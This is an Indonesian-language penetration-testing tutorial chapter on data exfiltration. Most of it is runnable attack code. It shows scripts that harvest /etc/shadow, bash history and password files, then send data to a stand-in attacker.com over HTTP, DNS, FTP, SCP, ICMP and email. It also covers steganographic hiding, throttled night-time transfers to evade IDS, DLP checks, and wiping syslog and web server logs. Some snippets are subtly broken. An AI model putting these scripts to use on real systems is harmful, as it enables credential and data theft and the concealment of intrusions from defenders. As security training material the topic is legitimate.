# 3.5 Data Exfiltration

Data exfiltration adalah proses menyalin data dari target network ke location yang dikontrol attacker. Ini adalah langkah terakhir dalam kill chain yang bertujuan untuk mengekstrak data berharga.

## Metodologi Data Exfiltration

1. **Data Identification** - Mengidentifikasi data berharga
2. **Data Collection** - Mengumpulkan data dari target
3. **Data Compression** - Mengecilkan ukuran data
4. **Data Encryption** - Mengamankan data saat transfer
5. **Data Transfer** - Mengirim data ke attacker
6. **Cleanup** - Membersihkan traces

## Data Identification & Collection

### Linux Data Collection

```bash
# Sistem info collection
#!/bin/bash
mkdir -p /tmp/exfil

# System information
hostname > /tmp/exfil/hostname.txt
uname -a > /tmp/exfil/uname.txt
id > /tmp/exfil/id.txt
ifconfig -a > /tmp/exfil/ifconfig.txt
ps aux > /tmp/exfil/processes.txt
netstat -antup > /tmp/exfil/netstat.txt

# User data
cat /etc/passwd > /tmp/exfil/passwd.txt
cat /etc/shadow > /tmp/exfil/shadow.txt
cat ~/.bash_history > /tmp/exfil/bash_history.txt

# Config files dengan passwords
find / -name "*.conf" -type f 2>/dev/null | xargs grep -l "password" > /tmp/exfil/password_files.txt

# Package everything
tar czf /tmp/exfil.tgz /tmp/exfil
```

### Windows Data Collection

```powershell
# PowerShell data collection script
mkdir C:\temp\exfil

# System information
systeminfo > C:\temp\exfil\systeminfo.txt
hostname > C:\temp\exfil\hostname.txt
whoami /all > C:\temp\exfil\whoami.txt
tasklist /v > C:\temp\exfil\processes.txt
netstat -anob > C:\temp\exfil\netstat.txt

# User information
net user > C:\temp\exfil\users.txt
net localgroup > C:\temp\exfil\groups.txt

# Registry keys dengan passwords
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon > C:\temp\exfil\winlogon.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist > C:\temp\exfil\userassist.txt

# Search untuk file dengan passwords
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.doc,*.xls,*.config | Select-String -Pattern "password" | Out-File C:\temp\exfil\password_files.txt

# Compress
Compress-Archive -Path C:\temp\exfil\* -DestinationPath C:\temp\exfil.zip
```

### Database Data Collection

```bash
# MySQL data export
mysqldump -u root -p --all-databases > /tmp/mysql_dump.sql
mysqldump -u root -p --databases database_name > /tmp/database.sql
mysqldump -u root -p database_name table_name > /tmp/table.sql

# SQL Server data export
sqlcmd -S server -U user -P password -Q "BACKUP DATABASE database_name TO DISK='C:\temp\database.bak'"

# PostgreSQL data export
pg_dump -U username -d database_name > /tmp/postgres_dump.sql
```

## Data Compression & Preparation

### File Compression Techniques

```bash
# Tar dengan compression
tar czf backup.t.gz /path/to/data/
tar cjf backup.tar.bz2 /path/to/data/
tar cJf backup.tar.xz /path/to/data/

# Zip dengan password
zip -re secure.zip /path/to/data/

# 7-Zip untuk maximum compression
7z a -mx9 -p$password archive.7z /path/to/data/
```

### Data Splitting untuk Large Files

```bash
# Split file menjadi chunks kecil
split -b 1M large_file.txt chunk_
# This creates chunk_aa, chunk_ab, etc.

# Gabung kembali
cat chunk_* > large_file.txt

# Split dengan numbered chunks
split -d -b 1M large_file.txt file_part_
# Creates file_part_00, file_part_01, etc.
```

### Data Encoding untuk Evasion

```bash
# Base64 encoding
base64 file.txt > file.txt.b64

# URL encoding
echo "http://attacker.com/data=$(cat file.txt | base64 -w0 | tr '+/' '-_')"

# Hex encoding
xxd -p file.txt | tr -d '\n' > file.txt.hex

# Convert dari hex kembali
xxd -r -p file.txt.hex > file.txt
```

## HTTP/HTTPS Exfiltration

### Simple HTTP Upload

```bash
# Attacker: Start HTTP server
python3 -m http.server 80

# Target: Upload data
curl -F "file=@/tmp/data.txt" http://attacker.com/upload.php

# POST data
curl -X POST -d "data=$(cat /tmp/data.txt)" http://attacker.com/receive.php

# Upload dengan headers untuk stealth
curl -F "file=@data.txt" -H "User-Agent: Mozilla/5.0" -H "Accept: */*" http://attacker.com/upload
```

### Advanced HTTP Exfiltration

```python
# Python client untuk multipart upload
import requests
import os

def upload_file(file_path, url, chunk_size=1024*1024):
    filename = os.path.basename(file_path)
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break

            files = {'file': (filename, chunk)}
            data = {'offset': f.tell() - len(chunk)}

            response = requests.post(url, files=files, data=data)
            if response.status_code != 200:
                print(f"Upload failed: {response.status_code}")
                return False

    return True

# Usage
upload_file('/tmp/large_file.zip', 'http://attacker.com/upload.php')
```

### Web Shell Based Exfiltration

```php
<?php
// upload.php - Simple PHP upload handler
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    echo "File uploaded successfully";
} else {
    echo "Upload failed";
}
?>

<?php
// advanced.php - Advanced upload dengan chunk support
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $target_file = "uploads/" . $_POST['filename'];
    $offset = intval($_POST['offset']);
    $chunk = file_get_contents($_FILES['chunk']['tmp_name']);

    $fp = fopen($target_file, 'c');
    fseek($fp, $offset);
    fwrite($fp, $chunk);
    fclose($fp);

    echo "Chunk uploaded successfully";
}
?>
```

## DNS Exfiltration

### Basic DNS Exfiltration

```bash
# Encode data dan send sebagai DNS queries
data=$(cat /etc/passwd | base64 -w0)
chunk_size=50

for i in $(seq 0 $chunk_size ${#data}); do
    chunk=${data:$i:$chunk_size}
    nslookup $chunk.attacker.com ns1.attacker.com
    sleep 1
done
```

### DNS Exfiltration dengan dnscat2

```bash
# Attacker: Start dnscat2 server
ruby dnscat2.rb --dns "domain=attacker.com" --secret "mysecret"

# Target: Connect dnscat2
./dnscat2 --dns server=attacker.com domain=attacker.com secret=mysecret

# Upload file dnscat2
upload /etc/passwd
```

### Custom DNS Exfiltration Script

```python
# dns_exfil.py
import socket
import base64

def dns_exfiltrate(data, domain, chunk_size=50):
    encoded = base64.b64encode(data.encode()).decode()

    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        subdomain = chunk + "." + domain

        try:
            socket.gethostbyname(subdomain)
        except socket.gaierror:
            pass

        sleep(0.1)

# Usage
with open('/etc/passwd', 'r') as f:
    data = f.read()
    dns_exfiltrate(data, 'attacker.com')
```

## FTP/FTPS Exfiltration

### FTP Upload Script

```bash
# Upload dengan FTP
#!/bin/bash
ftp -inv attacker.com << EOF
user username password
cd uploads
put /tmp/data.txt
bye
EOF

# Batch FTP upload untuk multiple files
find /data/ -type f -exec ftp -inv attacker.com << EOF
user username password
cd uploads
put {}
bye
EOF
```

### Python FTP Client

```python
# ftp_upload.py
from ftplib import FTP
import os

def ftp_upload(file_path, host, username, password, remote_dir='/'):
    ftp = FTP(host)
    ftp.login(username, password)
    ftp.cwd(remote_dir)

    with open(file_path, 'rb') as f:
        filename = os.path.basename(file_path)
        ftp.storbinary(f'STOR {filename}', f)

    ftp.quit()

# Usage
ftp_upload('/tmp/data.zip', 'attacker.com', 'user', 'password', 'uploads')
```

## SSH/SFTP Exfiltration

### SCP Transfer

```bash
# SCP upload
scp /tmp/data.txt user@attacker.com:/remote/path/

# Batch SCP upload
for file in /data/*.txt; do
    scp "$file" user@attacker.com:/remote/path/
done

# SCP dengan compression untuk large files
tar czf - /data/ | ssh user@attacker.com "cat > /remote/data.tar.gz"
```

### SFTP with Python

```python
# sftp_upload.py
import paramiko
import os

def sftp_upload(local_path, remote_path, host, username, password):
    transport = paramiko.Transport((host, 22))
    transport.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(transport)

    sftp.put(local_path, remote_path)

    sftp.close()
    transport.close()

# Usage
sftp_upload('/tmp/data.zip', '/remote/data.zip', 'attacker.com', 'user', 'password')
```

## ICMP Exfiltration

### ICMP Covert Channel

```python
# icmp_exfil.py
from scapy.all import *
import base64

def icmp_exfiltrate(data, target_ip):
    encoded = base64.b64encode(data.encode()).decode()
    chunk_size = 50

    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        packet = IP(dst=target_ip)/ICMP(type=8, id=0x1337)/Raw(load=chunk)
        send(packet)
        sleep(0.1)

# Usage
with open('/etc/passwd', 'r') as f:
    data = f.read()
    icmp_exfiltrate(data, 'attacker.com')
```

## Cloud Storage Exfiltration

### AWS S3 Upload

```python
# s3_upload.py
import boto3
from botocore.exceptions import NoCredentialsError

def upload_to_s3(file_path, bucket_name, s3_file_name):
    s3 = boto3.client('s3')

    try:
        s3.upload_file(file_path, bucket_name, s3_file_name)
        print("Upload successful")
        return True
    except FileNotFoundError:
        print("File not found")
        return False
    except NoCredentialsError:
        print("Credentials not available")
        return False

# Usage
upload_to_s3('/tmp/data.zip', 'my-bucket', 'backup.zip')
```

### Google Drive Upload

```python
# gdrive_upload.py
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

def upload_to_drive(file_path):
    gauth = GoogleAuth()
    gauth.LocalWebserverAuth()
    drive = GoogleDrive(gauth)

    file_drive = drive.CreateFile({'title': os.path.basename(file_path)})
    file_drive.SetContentFile(file_path)
    file_drive.Upload()

    print(f"File uploaded: {file_drive['id']}")

# Usage
upload_to_drive('/tmp/data.zip')
```

## Exfiltration via Email

### SMTP Exfiltration

```python
# email_exfil.py
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

def send_email_with_attachment(file_path, recipient):
    msg = MIMEMultipart()
    msg['From'] = 'attacker@gmail.com'
    msg['To'] = recipient
    msg['Subject'] = 'Backup Data'

    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(file_path)}')
    msg.attach(part)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login('attacker@gmail.com', 'password')
    smtp.send_message(msg)
    smtp.quit()

# Usage
send_email_with_attachment('/tmp/data.zip', 'recipient@gmail.com')
```

## Covert Exfiltration Channels

### Steganography in Images

```python
# stego_exfil.py
from PIL import Image
import base64

def hide_data_in_image(data_file, image_file, output_file):
    with open(data_file, 'rb') as f:
        data = f.read()

    encoded = base64.b64encode(data).decode()

    img = Image.open(image_file)
    binary_data = ''.join(format(ord(char), '08b') for char in encoded)

    if len(binary_data) > img.width * img.height * 3:
        raise ValueError("Data too large for image")

    pixels = list(img.getdata())
    new_pixels = []

    for i, pixel in enumerate(pixels):
        if i < len(binary_data):
            r, g, b = pixel
            new_r = r & ~1 | int(binary_data[i])
            new_pixels.append((new_r, g, b))
        else:
            new_pixels.append(pixel)

    new_img = Image.new(img.mode, img.size)
    new_img.putdata(new_pixels)
    new_img.save(output_file)

# Usage
hide_data_in_image('/etc/passwd', 'original.jpg', 'stego.jpg')
```

### Audio Steganography

```python
# audio_stego.py
import wave
import numpy as np

def hide_in_audio(data_file, audio_file, output_file):
    with open(data_file, 'rb') as f:
        data = f.read()

    binary = ''.join(format(byte, '08b') for byte in data)

    with wave.open(audio_file, 'r') as audio:
        params = audio.getparams()
        frames = audio.readframes(-1)
        frames_np = np.frombuffer(frames, dtype=np.int16)

    modified_frames = frames_np.copy()

    for i, bit in enumerate(binary):
        if i < len(modified_frames):
            modified_frames[i] = (modified_frames[i] & ~1) | int(bit)

    with wave.open(output_file, 'w') as output:
        output.setparams(params)
        output.writeframes(modified_frames.tobytes())

# Usage
hide_in_audio('/tmp/data.txt', 'input.wav', 'stego.wav')
```

## Rate Limiting & Throttling

### Slow Exfiltration untuk Evasion

```python
# slow_exfil.py
import time
import requests

def slow_exfiltrate(file_path, url, delay=1):
    with open(file_path, 'rb') as f:
        chunk_size = 1024
        chunk_num = 0

        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break

            files = {'chunk': chunk}
            data = {'number': chunk_num}

            response = requests.post(url, files=files, data=data)

            if response.status_code == 200:
                print(f"Chunk {chunk_num} uploaded successfully")
            else:
                print(f"Failed to upload chunk {chunk_num}")

            chunk_num += 1
            time.sleep(delay)

# Usage - Upload 1KB per 5 seconds
slow_exfiltrate('/tmp/large_file.zip', 'http://attacker.com/upload.php', delay=5)
```

### Time-based Exfiltration

```bash
# Exfiltrate hanya pada jam tertentu (malam hari)
#!/bin/bash
current_hour=$(date +%H)

if [ $current_hour -gt 22 ] || [ $current_hour -lt 6 ]; then
    echo "Exfiltrating data..."
    curl -F "file=@/tmp/data.txt" http://attacker.com/upload.php
fi
```

## Data Integrity Verification

### Checksums untuk Verify Upload

```bash
# Generate checksum sebelum upload
sha256sum /tmp/data.txt > checksum.txt
md5sum /tmp/data.txt >> checksum.txt

# Upload data dan checksum
curl -F "file=@/tmp/data.txt" -F "checksum=@checksum.txt" http://attacker.com/upload.php

# Verify setelah upload
sha256sum /tmp/data.txt
# Compare dengan checksum yang diterima attacker
```

### Parity Files untuk Recovery

```bash
# Create parity file dengan par2
par2create -r5 data.par2 /tmp/data.txt

# Upload data dan parity files
curl -F "file=@/tmp/data.txt" http://attacker.com/upload.php
curl -F "file=@data.par2" http://attacker.com/upload.php

# Recovery jika data corrupt:
# par2repair data.par2
```

## Cleanup After Exfiltration

### Remove Local Data

```bash
# Secure delete files
shred -vfz -n 3 /tmp/data.txt
rm -f /tmp/data.txt

# Wipe free space
dd if=/dev/zero of=/tmp/zero.txt bs=1M
rm -f /tmp/zero.txt

# Clear command history
history -c
history -w
```

### Clear Network Traces

```bash
# Clear network logs
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/secure

# Clear web server logs
echo > /var/log/apache2/access.log
echo > /var/log/nginx/access.log
```

## Countermeasures Detection

### Check untuk DLP

```bash
# Check jika DLP agent berjalan
ps aux | grep -i dlp
netstat -antup | grep -i dlp

# Check untuk network monitoring
netstat -antup | grep -E "(snort|suricata|bro|zeek)"
```

### Check untuk Firewalls

```bash
# Check firewall rules
iptables -L -n
firewall-cmd --list-all

# Check egress filtering
nmap -sS -p 80,443,53,25 -Pn attacker.com
```

## Best Practices

1. **Know Your Target** - Pilih method yang sesuai dengan network environment
2. **Rate Limiting** - Jangan trigger IDS/IPS dengan terlalu banyak traffic
3. **Encryption** - Selalu encrypt sensitive data
4. **Compression** - Reduce transfer time dan bandwidth
5. **Multiple Channels** - Gunakan berbagai methods jika satu gagal
6. **Validation** - Verify data integrity setelah transfer

## Important Notes

1. **Legal Considerations** - Hanya exfiltrate data yang authorized
2. **Stealth** - Minimize noise dan detection
3. **Bandwidth** - Consider bandwidth limitations
4. **Time Windows** - Choose optimal times untuk exfiltration
5. **Backup Plans** - Have multiple exfiltration methods

Data exfiltration adalah langkah krusial yang menentukan keberhasilan overall penetration testing. Pilih technique yang sesuai dengan environment constraints dan testing objectives.